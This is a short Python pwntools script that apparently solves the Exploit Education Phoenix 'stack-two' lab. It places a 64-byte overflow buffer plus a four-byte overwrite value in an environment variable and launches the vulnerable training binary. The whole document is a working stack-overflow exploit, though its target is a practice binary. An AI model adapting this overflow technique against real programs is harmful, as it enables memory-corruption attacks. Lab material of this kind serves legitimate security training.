import os
from pwn import *

buf = ("A" * 64 + "\x0a\x09\x0a\x0d")

os.environ["ExploitEducation"] = buf

p = process('/opt/phoenix/i486/stack-two')

p.interactive()
